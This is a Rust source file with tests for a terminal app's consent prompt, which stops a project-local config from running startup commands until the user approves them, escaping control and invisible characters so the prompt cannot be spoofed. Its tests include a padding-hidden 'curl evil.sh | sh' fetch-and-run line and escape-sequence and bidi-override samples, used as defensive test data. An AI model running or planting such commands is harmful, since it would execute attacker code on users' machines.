//! Startup pane tabs: which declared list opens at launch, the consent a
//! project-local list needs first, and the seeding itself.
//!
//! `~/.spycrc.toml`'s list (`pane.tabs`) opens unasked. A project-local
//! `.spycrc.toml`'s list (`pane.project_tabs`) runs commands the user never
//! wrote, so it opens only once they approve that exact list
//! (`state::tab_consent`), and it then replaces theirs. [`plan`] is the
//! decision; `PromptKind::ProjectTabsConsent` is the ask.

use unicode_segmentation::UnicodeSegmentation;

use crate::app::{App, Effect, Mode, Prompt, PromptKind, state};
use crate::config::PaneTabConfig;
use crate::state::tab_consent::{self, Consent};
use crate::ui::display_width;

/// What launch does with the declared startup tabs.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(super) enum Plan {
    Nothing,
    SeedUser,
    SeedProject,
    AskProject,
}

/// `project` is the recorded answer for the project-local list, when there is
/// one. `resume` wins outright: session restore rebuilds its own tabs, and
/// seeding beneath the picker would spawn ptys only to kill them moments later.
pub(super) const fn plan(resume: bool, has_user_tabs: bool, project: Option<Consent>) -> Plan {
    match project {
        _ if resume => Plan::Nothing,
        Some(Consent::Allowed) => Plan::SeedProject,
        Some(Consent::Unasked) => Plan::AskProject,
        Some(Consent::Denied) | None if has_user_tabs => Plan::SeedUser,
        Some(Consent::Denied) | None => Plan::Nothing,
    }
}

/// Longest command the consent prompt shows before cutting it short.
const SHOWN_COMMAND_COLS: usize = 120;

/// Zero-width and bidi format characters. They draw nothing, so left in they
/// could make a command read as something other than what runs.
fn is_invisible_format(c: char) -> bool {
    matches!(
        u32::from(c),
        0x00AD | 0x061C | 0x180E | 0x200B..=0x200F | 0x202A..=0x202E | 0x2060..=0x206F | 0xFEFF
    )
}

/// Text from a project's rc as the consent prompt shows it. Control and
/// invisible characters are escaped, so none reaches the terminal or fakes a
/// line of the prompt; whitespace runs collapse, so padding can't push a
/// payload out of view; and past [`SHOWN_COMMAND_COLS`] it is cut with a count
/// of what's hidden, so a long command reads as long rather than as its prefix.
pub(super) fn shown(text: &str) -> String {
    let mut out = String::new();
    let mut in_space = false;
    for c in text.trim().chars() {
        if c.is_control() || is_invisible_format(c) {
            out.extend(c.escape_default());
            in_space = false;
        } else if c.is_whitespace() {
            if !in_space {
                out.push(' ');
            }
            in_space = true;
        } else {
            out.push(c);
            in_space = false;
        }
    }
    if display_width(&out) <= SHOWN_COMMAND_COLS {
        return out;
    }
    let kept = crate::ui::display_truncate(&out, SHOWN_COMMAND_COLS);
    let hidden = out.chars().count() - kept.chars().count();
    format!("{kept}… (+{hidden} more chars)")
}

/// Break `text` into rows of at most `width` columns, by grapheme, with
/// `first` before the first row and `cont` before the rest. Character-wrapped
/// rather than word-wrapped: a command's exact spacing is part of what runs.
fn char_wrap(text: &str, width: usize, first: &str, cont: &str) -> Vec<String> {
    let mut rows = Vec::new();
    let mut cur = first.to_string();
    let mut cur_w = display_width(first);
    let mut has_text = false;
    for g in text.graphemes(true) {
        let gw = display_width(g);
        if has_text && cur_w + gw > width {
            rows.push(std::mem::replace(&mut cur, cont.to_string()));
            cur_w = display_width(cont);
        }
        cur.push_str(g);
        cur_w += gw;
        has_text = true;
    }
    rows.push(cur);
    rows
}

/// Word-wrap prose to `width`, breaking a word only when it can't fit a row.
fn word_wrap(text: &str, width: usize) -> Vec<String> {
    let mut rows: Vec<String> = Vec::new();
    let mut cur = String::new();
    for word in text.split(' ') {
        let sep = usize::from(!cur.is_empty());
        if display_width(&cur) + sep + display_width(word) <= width {
            if sep == 1 {
                cur.push(' ');
            }
            cur.push_str(word);
            continue;
        }
        if !cur.is_empty() {
            rows.push(std::mem::take(&mut cur));
        }
        let mut pieces = char_wrap(word, width, "", "");
        cur = pieces.pop().unwrap_or_default();
        rows.extend(pieces);
    }
    rows.push(cur);
    rows
}

/// The consent prompt's body at `width` columns: the question, then each tab
/// on rows of its own.
pub(super) fn consent_lines(question: &str, tabs: &[PaneTabConfig], width: usize) -> Vec<String> {
    let width = width.max(8);
    let mut rows = word_wrap(question, width);
    rows.push(String::new());
    for tab in tabs {
        let mut text = shown(&tab.command);
        if let Some(cwd) = &tab.cwd {
            text.push_str("   (in ");
            text.push_str(&shown(&cwd.to_string_lossy()));
            text.push(')');
        }
        rows.extend(char_wrap(&text, width, "• ", "  "));
    }
    rows
}

impl App {
    /// `:startup-tabs [forget]` — where this launch's startup tabs come from,
    /// and the undo for an accidental answer: `forget` drops the recorded
    /// answer for the project's list, so the next launch asks again.
    pub(super) fn cmd_startup_tabs(&mut self, arg: &str) -> Vec<Effect> {
        let user = self.state.config.pane.tabs.len();
        let project = self.state.config.pane.project_tabs.clone();
        match (arg.trim(), project) {
            ("" | "status", None) => self.state.flash_info(format!(
                "startup tabs: {user} from ~/.spycrc.toml; this project declares none"
            )),
            ("" | "status", Some(p)) => {
                let answer = match tab_consent::consent_for(&p.source, &p.tabs) {
                    Consent::Allowed => "approved (replaces yours)",
                    Consent::Denied => "declined",
                    Consent::Unasked => "not yet answered (asks at launch)",
                };
                self.state.flash_info(format!(
                    "startup tabs: {} declares {} — {answer}; {user} from ~/.spycrc.toml (`:startup-tabs forget` to be asked again)",
                    crate::paths::display_tilde(&p.source),
                    p.tabs.len()
                ));
            }
            ("forget", None) => self
                .state
                .flash_info("startup tabs: this project declares none — nothing to forget"),
            ("forget", Some(p)) => {
                let shown = crate::paths::display_tilde(&p.source);
                if tab_consent::forget(&p.source) {
                    self.state.flash_info(format!(
                        "startup tabs: forgot the answer for {shown} — asks at next launch"
                    ));
                } else {
                    self.state
                        .flash_info(format!("startup tabs: no answer recorded for {shown}"));
                }
            }
            (other, _) => self
                .state
                .flash_error(format!("usage: :startup-tabs [forget]  (got `{other}`)")),
        }
        Vec::new()
    }

    /// Launch's startup tabs: seed the approved list, or ask about a
    /// project-local list the user hasn't answered for yet.
    pub(super) fn start_startup_tabs(&mut self, resume: bool) {
        let project = self.state.config.pane.project_tabs.clone();
        let consent = project
            .as_ref()
            .map(|p| tab_consent::consent_for(&p.source, &p.tabs));
        let user = self.state.config.pane.tabs.clone();
        match plan(resume, !user.is_empty(), consent) {
            Plan::Nothing => {}
            Plan::SeedUser => self.seed_startup_tabs(&user, None),
            Plan::SeedProject => {
                if let Some(p) = project {
                    self.seed_startup_tabs(&p.tabs, None);
                }
            }
            Plan::AskProject => {
                if let Some(p) = project {
                    let question = format!(
                        "{} wants to open {} startup tab(s). Run these commands?",
                        crate::paths::display_tilde(&p.source),
                        p.tabs.len()
                    );
                    self.state.mode = Mode::Prompting(Prompt::simple(
                        PromptKind::ProjectTabsConsent {
                            source: p.source,
                            tabs: p.tabs,
                        },
                        question,
                    ));
                }
            }
        }
    }

    /// Seed `tabs` into the bottom pane — the config-driven analogue of
    /// pressing `^a c` once per tab. `note` leads the summary flash.
    pub(super) fn seed_startup_tabs(&mut self, tabs: &[PaneTabConfig], note: Option<&str>) {
        if tabs.is_empty() {
            if let Some(note) = note {
                self.state.flash_info(note);
            }
            return;
        }
        let launch_dir = self.state.start_dir.clone();
        let mut opened = 0usize;
        let mut cwd_fallbacks = 0usize;
        for tab in tabs {
            let cwd = match &tab.cwd {
                Some(p) => {
                    let expanded = if let Ok(stripped) = p.strip_prefix("~") {
                        match crate::config::home_dir() {
                            Some(h) => h.join(stripped),
                            None => p.clone(),
                        }
                    } else if p.is_relative() {
                        launch_dir.join(p)
                    } else {
                        p.clone()
                    };
                    if expanded.is_dir() {
                        expanded
                    } else {
                        cwd_fallbacks += 1;
                        self.state.default_pane_cwd()
                    }
                }
                None => self.state.default_pane_cwd(),
            };
            // `open_pane_tab_in` flashes per spawn and pulls focus to the
            // pane; both are overridden after the loop (summary flash,
            // focus back on the list — startup shouldn't steal the
            // keyboard the way an interactive `^a c` deliberately does).
            // `state.flash` is a single slot, not a queue, so a per-tab
            // error flashed here would be clobbered by that summary before
            // the first render — failures are counted into it instead.
            let spawned = self.open_pane_tab_in(&tab.command, &cwd);
            if spawned {
                opened += 1;
                if let Some(label) = &tab.label
                    && let Some(pane_tabs) = self.runtime.pane_tabs.as_mut()
                    && let Some(entry) = pane_tabs.tabs_mut().last_mut()
                {
                    entry.info.label.clone_from(label);
                }
            }
        }
        if let Some(pane_tabs) = self.runtime.pane_tabs.as_mut() {
            // Land on the first declared tab (the user ordered them;
            // spawning leaves the last one active).
            pane_tabs.switch_to(0);
        }
        self.state.focus = state::Focus::FileList;
        let lead = note.map(|n| format!("{n}; ")).unwrap_or_default();
        let summary = format!(
            "{lead}opened {opened}/{} startup tab(s) — ^a 1..9 to jump",
            tabs.len()
        );
        if cwd_fallbacks > 0 || opened < tabs.len() {
            self.state.flash_error(format!(
                "{summary} ({cwd_fallbacks} cwd not a directory, used default; \
                 {} failed to spawn)",
                tabs.len() - opened
            ));
        } else {
            self.state.flash_info(summary);
        }
    }
}

#[cfg(test)]
mod app_tests {
    use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};

    use crate::app::{App, Mode, Prompt, PromptKind};
    use crate::config::{PaneTabConfig, ProjectTabs};
    use crate::state::tab_consent::{self, Consent};

    fn tabs(commands: &[&str]) -> Vec<PaneTabConfig> {
        commands
            .iter()
            .map(|c| PaneTabConfig {
                command: (*c).to_string(),
                cwd: None,
                label: None,
            })
            .collect()
    }

    /// A launch in `dir` with the user's own `user` tabs and a project rc
    /// declaring `project`.
    fn launch(dir: &std::path::Path, user: &[&str], project: &[&str]) -> App {
        let mut app = App::test_app(dir.to_path_buf());
        app.state.config.pane.tabs = tabs(user);
        app.state.config.pane.project_tabs = Some(ProjectTabs {
            source: dir.join(".spycrc.toml"),
            tabs: tabs(project),
        });
        app.start_startup_tabs(false);
        app
    }

    fn opened(app: &App) -> Vec<String> {
        app.runtime.pane_tabs.as_ref().map_or_else(Vec::new, |t| {
            t.tabs().iter().map(|e| e.info.command.clone()).collect()
        })
    }

    fn asking(app: &App) -> bool {
        matches!(
            &app.state.mode,
            Mode::Prompting(Prompt {
                kind: PromptKind::ProjectTabsConsent { .. },
                ..
            })
        )
    }

    fn press(app: &mut App, code: KeyCode) {
        app.handle_key(KeyEvent::new(code, KeyModifiers::NONE))
            .expect("key handled");
    }

    fn answer(dir: &std::path::Path, project: &[&str]) -> Consent {
        tab_consent::consent_for(&dir.join(".spycrc.toml"), &tabs(project))
    }

    #[test]
    fn an_unanswered_project_list_asks_and_runs_nothing() {
        let tmp = tempfile::tempdir().unwrap();
        crate::state::with_state_root(tmp.path(), || {
            let app = launch(tmp.path(), &["cat"], &["cat", "cat"]);
            assert!(asking(&app));
            assert!(opened(&app).is_empty(), "spawned before an answer");
        });
    }

    /// The prompt asks about running commands, so no key but `y` may approve
    /// and no key but `n` or `Esc` may close it; the rest re-raise it and
    /// record nothing.
    #[test]
    fn stray_keys_never_answer() {
        let tmp = tempfile::tempdir().unwrap();
        crate::state::with_state_root(tmp.path(), || {
            let mut app = launch(tmp.path(), &["cat"], &["cat", "cat"]);
            for code in [
                KeyCode::Enter,
                KeyCode::Char(' '),
                KeyCode::Char('x'),
                KeyCode::Char('q'),
                KeyCode::Tab,
                KeyCode::Char(':'),
            ] {
                press(&mut app, code);
                assert!(asking(&app), "{code:?} closed the prompt");
                assert!(opened(&app).is_empty(), "{code:?} spawned tabs");
                assert_eq!(answer(tmp.path(), &["cat", "cat"]), Consent::Unasked);
            }
        });
    }

    #[test]
    fn y_approves_this_list_and_opens_it_instead_of_the_users() {
        let tmp = tempfile::tempdir().unwrap();
        crate::state::with_state_root(tmp.path(), || {
            let mut app = launch(tmp.path(), &["cat"], &["cat", "cat"]);
            press(&mut app, KeyCode::Char('y'));
            assert!(!asking(&app));
            assert_eq!(opened(&app).len(), 2, "the project's two tabs");
            assert_eq!(answer(tmp.path(), &["cat", "cat"]), Consent::Allowed);
        });
    }

    #[test]
    fn n_declines_for_this_list_and_opens_the_users_own() {
        let tmp = tempfile::tempdir().unwrap();
        crate::state::with_state_root(tmp.path(), || {
            let mut app = launch(tmp.path(), &["cat"], &["cat", "cat"]);
            press(&mut app, KeyCode::Char('n'));
            assert!(!asking(&app));
            assert_eq!(opened(&app).len(), 1, "the user's one tab");
            assert_eq!(answer(tmp.path(), &["cat", "cat"]), Consent::Denied);
            // Remembered: the next launch opens the user's tabs, unasked.
            let again = launch(tmp.path(), &["cat"], &["cat", "cat"]);
            assert!(!asking(&again));
            assert_eq!(opened(&again).len(), 1);
        });
    }

    #[test]
    fn esc_skips_this_launch_and_asks_the_next() {
        let tmp = tempfile::tempdir().unwrap();
        crate::state::with_state_root(tmp.path(), || {
            let mut app = launch(tmp.path(), &["cat"], &["cat", "cat"]);
            press(&mut app, KeyCode::Esc);
            assert!(!asking(&app));
            assert_eq!(opened(&app).len(), 1, "the user's one tab");
            assert_eq!(answer(tmp.path(), &["cat", "cat"]), Consent::Unasked);
            assert!(asking(&launch(tmp.path(), &["cat"], &["cat", "cat"])));
        });
    }

    #[test]
    fn an_approved_list_opens_unasked_until_it_changes() {
        let tmp = tempfile::tempdir().unwrap();
        crate::state::with_state_root(tmp.path(), || {
            let rc = tmp.path().join(".spycrc.toml");
            tab_consent::set_consent(&rc, &tabs(&["cat", "cat"]), true);
            let app = launch(tmp.path(), &[], &["cat", "cat"]);
            assert!(!asking(&app));
            assert_eq!(opened(&app).len(), 2);
            // The rc gained a command since the approval: ask, run nothing.
            let edited = launch(tmp.path(), &[], &["cat", "cat", "cat -u"]);
            assert!(asking(&edited));
            assert!(opened(&edited).is_empty());
        });
    }

    #[test]
    fn forget_makes_the_next_launch_ask() {
        let tmp = tempfile::tempdir().unwrap();
        crate::state::with_state_root(tmp.path(), || {
            let rc = tmp.path().join(".spycrc.toml");
            tab_consent::set_consent(&rc, &tabs(&["cat"]), false);
            let mut app = launch(tmp.path(), &[], &["cat"]);
            assert!(!asking(&app));
            app.cmd_startup_tabs("forget");
            assert_eq!(answer(tmp.path(), &["cat"]), Consent::Unasked);
            assert!(asking(&launch(tmp.path(), &[], &["cat"])));
        });
    }

    /// What the user is shown is what runs: every command draws in the pop-up,
    /// and a control character in one reaches the screen escaped, never raw.
    #[test]
    fn the_popup_shows_every_command_and_no_raw_control_chars() {
        use ratatui::{Terminal, backend::TestBackend};
        let tmp = tempfile::tempdir().unwrap();
        crate::state::with_state_root(tmp.path(), || {
            let mut app = launch(
                tmp.path(),
                &[],
                &["claude", "zsh\u{1b}[2J", "sh -c 'make watch'"],
            );
            assert!(asking(&app));
            let mut terminal = Terminal::new(TestBackend::new(80, 24)).unwrap();
            terminal.draw(|f| app.render(f)).unwrap();
            let buf = terminal.backend().buffer().clone();
            let mut out = String::new();
            for y in 0..buf.area.height {
                for x in 0..buf.area.width {
                    out.push_str(buf.cell((x, y)).map_or(" ", |c| c.symbol()));
                }
                out.push('\n');
            }
            for needle in [
                "project startup tabs",
                "• claude",
                "• zsh\\u{1b}[2J",
                "• sh -c 'make watch'",
                "[y]",
                "[n]",
                "[Esc]",
            ] {
                assert!(out.contains(needle), "{needle:?} missing:\n{out}");
            }
            assert!(
                !out.chars().any(|c| c == '\u{1b}'),
                "a raw ESC reached the buffer:\n{out}"
            );
        });
    }

    #[test]
    fn resume_neither_asks_nor_seeds() {
        let tmp = tempfile::tempdir().unwrap();
        crate::state::with_state_root(tmp.path(), || {
            let mut app = App::test_app(tmp.path().to_path_buf());
            app.state.config.pane.tabs = tabs(&["cat"]);
            app.state.config.pane.project_tabs = Some(ProjectTabs {
                source: tmp.path().join(".spycrc.toml"),
                tabs: tabs(&["cat"]),
            });
            app.start_startup_tabs(true);
            assert!(!asking(&app));
            assert!(opened(&app).is_empty());
        });
    }
}

#[cfg(test)]
mod tests {
    use super::{Plan, SHOWN_COMMAND_COLS, consent_lines, plan, shown};
    use crate::config::PaneTabConfig;
    use crate::state::tab_consent::Consent;
    use crate::ui::display_width;

    fn tab(command: &str, cwd: Option<&str>) -> PaneTabConfig {
        PaneTabConfig {
            command: command.to_string(),
            cwd: cwd.map(std::path::PathBuf::from),
            label: None,
        }
    }

    #[test]
    fn only_an_approved_project_list_seeds_itself() {
        use Consent::{Allowed, Denied, Unasked};
        for (resume, user, project, want) in [
            (true, true, Some(Allowed), Plan::Nothing),
            (true, false, Some(Unasked), Plan::Nothing),
            (false, true, Some(Allowed), Plan::SeedProject),
            (false, false, Some(Allowed), Plan::SeedProject),
            (false, true, Some(Unasked), Plan::AskProject),
            (false, false, Some(Unasked), Plan::AskProject),
            (false, true, Some(Denied), Plan::SeedUser),
            (false, false, Some(Denied), Plan::Nothing),
            (false, true, None, Plan::SeedUser),
            (false, false, None, Plan::Nothing),
        ] {
            assert_eq!(
                plan(resume, user, project),
                want,
                "resume={resume} user={user} project={project:?}"
            );
        }
    }

    #[test]
    fn shown_escapes_what_would_draw_nothing_or_fake_a_line() {
        for (raw, visible) in [
            ("claude\u{1b}[2J", "\\u{1b}"),
            ("zsh\nclaude", "\\n"),
            ("a\rb", "\\r"),
            ("sh -c 'x'\u{202e}lruc", "\\u{202e}"),
            ("clau\u{200b}de", "\\u{200b}"),
        ] {
            let out = shown(raw);
            assert!(out.contains(visible), "{raw:?} shown as {out:?}");
            assert!(
                !out.chars().any(char::is_control),
                "{raw:?} kept a control char: {out:?}"
            );
        }
    }

    #[test]
    fn shown_collapses_padding_and_says_how_much_it_cut() {
        let padded = format!("claude{}; curl evil.sh | sh", " ".repeat(500));
        assert_eq!(shown(&padded), "claude ; curl evil.sh | sh");
        let long = format!("x{}", "y".repeat(400));
        let out = shown(&long);
        assert!(out.ends_with("… (+281 more chars)"), "{out}");
        assert!(display_width(&out) <= SHOWN_COMMAND_COLS + 20);
    }

    #[test]
    fn consent_lines_fit_the_width_and_show_every_command() {
        let tabs = [
            tab("claude", None),
            tab(&format!("sh -c '{}'", "z".repeat(90)), Some("../elsewhere")),
            tab("zsh", None),
        ];
        let question =
            "~/src/repo/.spycrc.toml wants to open 3 startup tab(s). Run these commands?";
        for width in [20, 40, 64] {
            let rows = consent_lines(question, &tabs, width);
            for row in &rows {
                assert!(display_width(row) <= width, "{row:?} over {width}");
            }
            // Rejoin the wrapped tab rows without their two-column lead.
            let joined: String = rows
                .iter()
                .map(|r| {
                    r.strip_prefix("• ")
                        .or_else(|| r.strip_prefix("  "))
                        .unwrap_or(r)
                })
                .collect();
            for needle in ["claude", "zsh", "../elsewhere"] {
                assert!(joined.contains(needle), "{needle} missing at {width}");
            }
            assert_eq!(rows.iter().filter(|r| r.starts_with("• ")).count(), 3);
        }
    }
}
